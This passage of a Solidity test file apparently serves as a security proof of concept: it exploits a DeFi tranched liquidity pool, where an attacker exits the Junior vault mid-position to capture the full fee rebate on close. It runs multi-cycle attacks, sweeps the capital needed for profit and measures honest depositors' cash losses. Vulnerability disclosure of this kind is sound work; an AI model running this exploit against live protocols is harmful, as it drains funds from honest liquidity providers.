    ///      open (isolates the NAV-timing root cause from any depth effect), and leaves before the next cycle.
    function _cycle(
        uint256 lpAssets,
        bool exitMid,
        bool refill
    ) internal returns (CycleOut memory o) {
        uint256 e = _nextEpochStart();
        assertLt(_now(), e - 300, "before LP request cutoff");

        // (1) attacker LP joins Junior for epoch e
        uint256 w = settlementToken.balanceOf(ALP);
        if (w < lpAssets) {
            _mintAttacker(ALP, lpAssets - w);
        }
        vm.prank(ALP);
        uint256 depId = juniorVault.requestDeposit(lpAssets, ALP, ALP);

        // (2) epoch e settles (pending refill exit from the previous cycle is funded first)
        _warpTo(e + 10);
        _settle();
        _claimRefillRedeemIfAny();
        vm.prank(ALP);
        juniorVault.claimDeposit(depId, lpAssets, ALP, ALP);
        o.f = (juniorVault.balanceOf(ALP) * 1e18) / juniorVault.totalSupply();

        // (3) attacker trader opens the max-skew long; positive VPI lands in Junior NAV immediately
        o.depthOpen = _netDepth();
        uint256 jNav0 = juniorVault.totalAssets();
        int256 sNav0 = int256(seniorVault.totalAssets());
        o.sizeLots = _openMaxSkewLong();
        (,,,,,, o.vpiPaid) = engine.positions(TRADER);
        o.navJumpOnOpen = juniorVault.totalAssets() - jNav0;
        o.seniorNavJumpOnOpen = int256(seniorVault.totalAssets()) - sNav0;

        uint256 redeemId;
        if (exitMid) {
            // (4) after the 1h deposit cooldown, attacker LP requests a full exit for epoch e+2h
            _warpTo(e + 1 hours + 60);
            _pokeMark(); // fresh mark so NAV previews / LP deposits are live
            uint256 sh = juniorVault.maxRequestRedeem(ALP);
            uint256 expectedOut = juniorVault.convertToAssets(sh);
            vm.prank(ALP);
            redeemId = juniorVault.requestRedeem(sh, ALP, ALP);
            if (refill) {
                // size the unrelated deposit so that depth at the close == depth at the open (aimed ~100 USDG below,
                // because ~30 USDG of trader carry also reaches pool cash before the close)
                o.refillAssets = o.depthOpen + expectedOut - pool.totalAssets() - 100e6;
                settlementToken.mint(REFILL, o.refillAssets);
                refillIn += o.refillAssets;
                vm.prank(REFILL);
                uint256 rid = juniorVault.requestDeposit(o.refillAssets, REFILL, REFILL);
                _warpTo(e + 2 hours + 10);
                _settle();
                uint256 cl = juniorVault.claimableDepositRequest(rid, REFILL);
                vm.prank(REFILL);
                juniorVault.claimDeposit(rid, cl, REFILL, REFILL);
            } else {
                _warpTo(e + 2 hours + 10);
                _settle();
            }
            uint256 cs = juniorVault.claimableRedeemRequest(redeemId, ALP);
            uint256 b0 = settlementToken.balanceOf(ALP);
            vm.prank(ALP);
            juniorVault.claimRedeem(redeemId, cs, ALP, ALP);
            o.lpRedeemed = settlementToken.balanceOf(ALP) - b0;
            assertEq(juniorVault.balanceOf(ALP), 0, "attacker LP fully out");
            assertEq(juniorVault.pendingRedeemRequest(redeemId, ALP), 0, "attacker exit fully funded");
        } else {
            // control: same hold time, the LP stays in through the close (no LP work is due at e+2h)
            _warpTo(e + 2 hours + 10);
        }

        // (5) attacker trader closes: the skew-reducing close rebates the lifetime VPI from pool cash
        (o.closeVpiDelta, o.unclampedCloseVpi, o.depthClose) = _closeLong(o.sizeLots);

        if (!exitMid) {
            // control: LP exits only after the position is closed
            _warpTo(e + 2 hours + 120);
            uint256 sh = juniorVault.maxRequestRedeem(ALP);
            vm.prank(ALP);
            redeemId = juniorVault.requestRedeem(sh, ALP, ALP);
            _warpTo(e + 3 hours + 10);
            _settle();
            uint256 cs = juniorVault.claimableRedeemRequest(redeemId, ALP);
            vm.prank(ALP);
            juniorVault.claimRedeem(redeemId, cs, ALP, ALP);
            assertEq(juniorVault.balanceOf(ALP), 0, "control LP fully out");
        }
        if (refill) {
            // the unrelated LP leaves after its own cooldown; it is funded at the next cycle's first settlement
            _warpTo(e + 3 hours + 60);
            uint256 sh = juniorVault.maxRequestRedeem(REFILL);
            vm.prank(REFILL);
            lastRefillRedeemId = juniorVault.requestRedeem(sh, REFILL, REFILL);
            refillRedeemPending = true;
        }
    }

    function _finalSettle() internal {
        _warpTo(_nextEpochStart() + 10);
        _settle();
        _claimRefillRedeemIfAny();
    }

    function _logCycle(
        uint256 i,
        CycleOut memory o,
        int256 dAtt,
        int256 dHon,
        int256 cumAtt,
        int256 cumHon
    ) internal pure {
        console2.log("---- cycle", i);
        console2.log("  attacker share of Junior f (bps)", o.f / 1e14);
        console2.log("  depth at open / at close (USDG)", o.depthOpen / 1e6, o.depthClose / 1e6);
        console2.log("  long size (lots of 100 USDG)", o.sizeLots);
        console2.log("  VPI paid at open (atoms)", o.vpiPaid);
        console2.log("  Junior NAV jump on open (atoms)", o.navJumpOnOpen);
        console2.log("  close VPI delta applied (atoms)", o.closeVpiDelta);
        console2.log("  close VPI unclamped @close depth", o.unclampedCloseVpi);
        console2.log("  attacker PnL this cycle (atoms)", dAtt);
        console2.log("  honest Junior PnL this cycle   ", dHon);
        console2.log("  attacker cumulative PnL (atoms)", cumAtt);
        console2.log("  honest Junior cumulative PnL   ", cumHon);
    }

    /// @dev Runs `n` cycles and returns cumulative attacker / honest-Junior / honest-Senior PnL (atoms).
    function _run(
        uint256 n,
        uint256 lpAssets,
        bool exitMid,
        bool refill,
        bool assertPerCycle
    ) internal returns (int256 cumAtt, int256 cumHon, int256 cumSen, uint256 t0, uint256 t1) {
        uint256 honestJ0 = _honestJuniorValue();
        uint256 honestS0 = _honestSeniorValue();
        // the attacker's trader margin sits in the clearinghouse; deposit funds in the LP wallet are minted per cycle
        int256 att0 = _attackerPnl();
        t0 = _now();
        int256 prevAtt = att0;
        int256 prevHon = 0;
        for (uint256 i = 1; i <= n; ++i) {
            CycleOut memory o = _cycle(lpAssets, exitMid, refill);
            _pokeMark(); // value everything at a fresh mark (stale-mark previews fall back to stored principal)
            int256 att = _attackerPnl();
            int256 hon = _honestJuniorPnl(honestJ0);
            _logCycle(i, o, att - prevAtt, hon - prevHon, att - att0, hon);
            // VPI really was paid and refunded in full by the same position
            assertGt(o.vpiPaid, 0, "positive VPI paid at open");
            assertApproxEqAbs(o.navJumpOnOpen, uint256(o.vpiPaid), 1e6, "Junior NAV books the whole VPI at open");
            if (exitMid) {
                // the exiting LP's share of V is gone, yet the same position gets ALL of V back
                assertEq(-o.closeVpiDelta, o.vpiPaid, "close VPI rebate == open VPI paid");
            } else {
                // control: depth at the close is larger (V and carry stayed in the pool), rebate is <= V
                assertLe(-o.closeVpiDelta, o.vpiPaid, "control rebate <= paid");
            }
            if (refill) {
                // depth at the close equals depth at the open: no depth effect, unclamped rebate ~= paid
                // depth at the close equals the open depth to within 0.003%; the UNCLAMPED close rebate computed at the
                // close depth equals the open VPI to within 0.003%, so neither depth nor the clamp contributes
                assertApproxEqAbs(o.depthClose, o.depthOpen, 200e6, "constant depth");
                assertApproxEqRel(-o.unclampedCloseVpi, o.vpiPaid, 3e13, "unclamped close rebate == open VPI");
            }
            if (assertPerCycle && exitMid) {
                assertGt(att - prevAtt, 0, "attacker profits every cycle");
                assertLt(hon - prevHon, 0, "honest Junior loses every cycle");
            }
            prevAtt = att;
            prevHon = hon;
        }
        if (refill) {
            _finalSettle();
        }
        t1 = _now();
        cumAtt = _attackerPnl() - att0;
        cumHon = _honestJuniorPnl(honestJ0);
        cumSen = int256(_honestSeniorValue()) - int256(honestS0);
    }

    function _report(
        string memory label,
        int256 cumAtt,
        int256 cumHon,
        int256 cumSen,
        uint256 t0,
        uint256 t1,
        uint256 n
    ) internal pure {
        console2.log("==========", label);
        console2.log("  cycles", n);
        console2.log("  elapsed seconds", t1 - t0);
        console2.log("  attacker cumulative PnL (USDG)", cumAtt / 1e6);
        console2.log("  honest Junior cumulative PnL (USDG)", cumHon / 1e6);
        console2.log("  honest Senior cumulative PnL (USDG, coupon)", cumSen / 1e6);
        // honest-Junior loss per day as bps of the honest Junior capital
        int256 lossBpsPerDay = (cumHon * 10_000 * int256(1 days)) / int256(HONEST_JUNIOR) / int256(t1 - t0);
        console2.log("  honest Junior PnL per day (bps of capital)", lossBpsPerDay);
    }

    // ------------------------------------------------------------------
    // (1) single cycle, constant depth: close rebate == open VPI, no depth effect
    // ------------------------------------------------------------------

    function test_PoC_SingleCycle_ConstantDepth() public {
        (int256 att, int256 hon, int256 sen, uint256 t0, uint256 t1) = _run(1, 4_250_000e6, true, true, true);
        _report("single cycle, constant depth, f~0.85", att, hon, sen, t0, t1, 1);
        assertGt(att, 0, "attacker gains at a constant price");
        assertLt(hon, 0, "honest Junior LPs lose");
    }

    // ------------------------------------------------------------------
    // (2) repeated attack: 8 cycles (3h each => 8 cycles/day)
    // ------------------------------------------------------------------

    function test_PoC_EightCycles_Natural() public {
        (int256 att, int256 hon, int256 sen, uint256 t0, uint256 t1) = _run(8, 4_250_000e6, true, false, true);
        _report("8 cycles, attack (no refill)", att, hon, sen, t0, t1, 8);
        assertGt(att, 0, "attacker cumulative gain");
        assertLt(hon, 0, "honest Junior cumulative loss");
    }

    /// @notice Same as above but every cycle an unrelated LP refills depth in the exit epoch (and leaves before the
    ///         next open), so the close is priced at exactly the open depth every time. 4h cycles.
    function test_PoC_EightCycles_ConstantDepth() public {
        (int256 att, int256 hon, int256 sen, uint256 t0, uint256 t1) = _run(8, 4_250_000e6, true, true, true);
        _report("8 cycles, attack, constant depth", att, hon, sen, t0, t1, 8);
        assertGt(att, 0, "attacker cumulative gain");
        assertLt(hon, 0, "honest Junior cumulative loss");
    }

    // ------------------------------------------------------------------
    // (3) control: identical trades, LP stays in through the close => attacker only pays fees
    // ------------------------------------------------------------------

    function test_Control_EightCycles_NoMidExit() public {
        (int256 att, int256 hon, int256 sen, uint256 t0, uint256 t1) = _run(8, 4_250_000e6, false, false, false);
        _report("8 cycles, CONTROL (LP exits after close)", att, hon, sen, t0, t1, 8);
        assertLt(att, 0, "control: attacker loses (fees)");
    }

    // ------------------------------------------------------------------
    // f sweep: what attacker Junior share is needed for profit
    // ------------------------------------------------------------------

    function test_FSweep_SingleCycle() public {
        uint256[7] memory amts =
            [uint256(250_000e6), 400_000e6, 500_000e6, 600_000e6, 1_000_000e6, 2_000_000e6, 4_250_000e6];
        bool sawLoss;
        bool sawProfit;
        for (uint256 i = 0; i < amts.length; ++i) {
            uint256 snap = vm.snapshotState();
            uint256 honestJ0 = _honestJuniorValue();
            int256 a0 = _attackerPnl();
            CycleOut memory o = _cycle(amts[i], true, false);
            int256 att = _attackerPnl() - a0;
            int256 hon = _honestJuniorPnl(honestJ0);
            console2.log("attacker LP assets (USDG)", amts[i] / 1e6);
            console2.log("   f (bps)", o.f / 1e14);
            console2.log("   attacker PnL (USDG*1e6)", att);
            console2.log("   honest Junior PnL", hon);
            if (att < 0) {
                sawLoss = true;
            } else {
                sawProfit = true;
            }
            vm.revertToState(snap);
        }
        assertTrue(sawLoss && sawProfit, "threshold f lies inside the sweep");
    }

    // ------------------------------------------------------------------
    // (5) Senior tranche
    // ------------------------------------------------------------------

    /// @notice Senior NAV does not book the VPI (it all goes to Junior), so a Senior-only attacker exiting mid-position
    ///         captures nothing and just pays fees.
    function test_Senior_OnlyAttackerCapturesNothing() public {
        uint256 e = _nextEpochStart();
        _mintAttacker(SLP, 400_000e6);
        vm.prank(SLP);
        uint256 dep = seniorVault.requestDeposit(400_000e6, SLP, SLP); // ~max under the 80% Senior share cap
        _warpTo(e + 10);
        _settle();
        vm.prank(SLP);
        seniorVault.claimDeposit(dep, 400_000e6, SLP, SLP);
        int256 a0 = _attackerPnl();

        uint256 s0 = seniorVault.totalAssets();
        uint256 j0 = juniorVault.totalAssets();
        uint256 lots = _openMaxSkewLong();
        (,,,,,, int256 vpi) = engine.positions(TRADER);
        console2.log("VPI paid", vpi);
        console2.log("Senior NAV change on open", int256(seniorVault.totalAssets()) - int256(s0));
        console2.log("Junior NAV change on open", int256(juniorVault.totalAssets()) - int256(j0));
        assertApproxEqAbs(juniorVault.totalAssets() - j0, uint256(vpi), 1e6, "all VPI goes to Junior NAV");
        // only seconds of coupon accrual (a few thousand atoms) vs V of ~2,900 USDG
        assertLe(seniorVault.totalAssets(), s0 + uint256(vpi) / 10_000, "Senior NAV does not book VPI");

        _warpTo(e + 1 hours + 60);
        uint256 sh = seniorVault.maxRequestRedeem(SLP);
        vm.prank(SLP);
        uint256 rid = seniorVault.requestRedeem(sh, SLP, SLP);
        _warpTo(e + 2 hours + 10);
        _settle();
        uint256 cs = seniorVault.claimableRedeemRequest(rid, SLP);
        vm.prank(SLP);
        seniorVault.claimRedeem(rid, cs, SLP, SLP);
        _closeLong(lots);
        int256 att = _attackerPnl() - a0;
        console2.log("Senior-only attacker PnL (atoms, incl. coupon)", att);
        assertLt(att, 0, "Senior-only attacker cannot capture VPI");
    }

    /// @notice Mixed attacker: attacker also supplies Senior capital (0.3M). Senior does not capture VPI but enlarges depth
    ///         (=> larger max skew and larger V, all landing in Junior NAV) and earns the Senior coupon paid by Junior.
    function test_Mixed_SeniorPlusJuniorAttacker() public {
        uint256 e = _nextEpochStart();
        _mintAttacker(SLP, 300_000e6);
        vm.prank(SLP);
        uint256 dep = seniorVault.requestDeposit(300_000e6, SLP, SLP);
        _warpTo(e + 10);
        _settle();
        vm.prank(SLP);
        seniorVault.claimDeposit(dep, 300_000e6, SLP, SLP);
        (int256 att, int256 hon, int256 sen, uint256 t0, uint256 t1) = _run(8, 4_000_000e6, true, false, true);
        _report("8 cycles, mixed (attacker Senior 0.3M + Junior 4M)", att, hon, sen, t0, t1, 8);
        assertGt(att, 0, "mixed attacker gains");
        assertLt(hon, 0, "honest Junior loses");
    }


    // ------------------------------------------------------------------
    // FINAL EVIDENCE 1: prove the actual CASH-funded action rebate,
    // not only the close preview's negative VPI component.
    // ------------------------------------------------------------------

    function test_Final_ActualActionRebateSettledFromPoolCash() public {
        vm.recordLogs();
        CycleOut memory o = _cycle(4_250_000e6, true, false);
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bytes32 sig = keccak256("ActionRebateSettled(address,uint256,uint256,uint256)");
        uint256 matches;
        uint256 assessed;
        uint256 paid;
        uint256 waived;
        for (uint256 i = 0; i < logs.length; ++i) {
            if (logs[i].topics.length == 0 || logs[i].topics[0] != sig) continue;
            ++matches;
            assertEq(logs[i].topics.length, 2, "rebate event must have indexed trader");
            assertEq(address(uint160(uint256(logs[i].topics[1]))), TRADER, "rebate beneficiary");
            (assessed, paid, waived) = abi.decode(logs[i].data, (uint256, uint256, uint256));
        }
        assertEq(matches, 1, "exactly one trader close rebate event");
        assertGt(paid, 0, "rebate actually funded from HousePool cash");
        assertEq(assessed, paid + waived, "actual rebate settlement accounting");
        assertLe(paid, uint256(o.vpiPaid), "net paid rebate not greater than VPI component");
        assertEq(-o.closeVpiDelta, o.vpiPaid, "lifetime clamp fully reverses VPI component");

        console2.log("FINAL open positive VPI (USDG atoms)", o.vpiPaid);
        console2.log("FINAL applied negative VPI on close (USDG atoms)", o.closeVpiDelta);
        console2.log("FINAL net rebate assessed (USDG atoms)", assessed);
        console2.log("FINAL net rebate actually paid from pool (USDG atoms)", paid);
        console2.log("FINAL unpaid rebate waived (USDG atoms)", waived);
    }

    // ------------------------------------------------------------------
    // FINAL EVIDENCE 2: passive, pre-existing Junior LP actually claims
    // less USDG for a fixed slice of shares than the pre-attack value.
    // Includes seed shares in the baseline to avoid share-price assumptions.
    // ------------------------------------------------------------------

    function test_Final_PassiveJuniorRealizedCashRedemptionShortfall() public {
        uint256 initialHonestShares = juniorVault.balanceOf(address(this));
        uint256 initialHonestAssets = _honestJuniorValue();
        assertGt(initialHonestShares, 0, "honest LP initially holds shares");
        assertGt(initialHonestAssets, 0, "honest LP initially owns principal");

        CycleOut memory o = _cycle(4_250_000e6, true, false);
        assertEq(-o.closeVpiDelta, o.vpiPaid, "VPI component fully reverses");
        _pokeMark();

        // Redeem only 10% of the freely withdrawable honest shares;
        // this respects the pool's Senior covenant while obtaining real USDG.
        uint256 redeemShares = juniorVault.maxRequestRedeem(address(this)) / 10;
        assertGt(redeemShares, 0, "passive Junior redeem slice is nonzero");
        uint256 baselineAssetsForShares = initialHonestAssets * redeemShares / initialHonestShares;
        uint256 quotedAssetsAfterAttack = juniorVault.convertToAssets(redeemShares);
        assertLt(quotedAssetsAfterAttack, baselineAssetsForShares, "victim share NAV fell after attack");

        uint256 rid = juniorVault.requestRedeem(redeemShares, address(this), address(this));
        _warpTo(_nextEpochStart() + 10);
        _settle();
        uint256 claimableShares = juniorVault.claimableRedeemRequest(rid, address(this));
        assertEq(claimableShares, redeemShares, "requested honest slice fully funded at epoch");
        uint256 cashBefore = settlementToken.balanceOf(address(this));
        uint256 paidAssets = juniorVault.claimRedeem(rid, claimableShares, address(this), address(this));
        uint256 cashReceived = settlementToken.balanceOf(address(this)) - cashBefore;
        assertEq(cashReceived, paidAssets, "actual USDG transfer equals claim settlement");
        assertLt(cashReceived, baselineAssetsForShares, "victim receives fewer USDG than pre-attack share value");

        console2.log("FINAL passive Junior redeemed shares", redeemShares);
        console2.log("FINAL pre-attack value of same shares (USDG atoms)", baselineAssetsForShares);
        console2.log("FINAL post-attack NAV quote (USDG atoms)", quotedAssetsAfterAttack);
        console2.log("FINAL actual USDG received (atoms)", cashReceived);
        console2.log("FINAL realized USDG shortfall (atoms)", baselineAssetsForShares - cashReceived);
    }
}
```

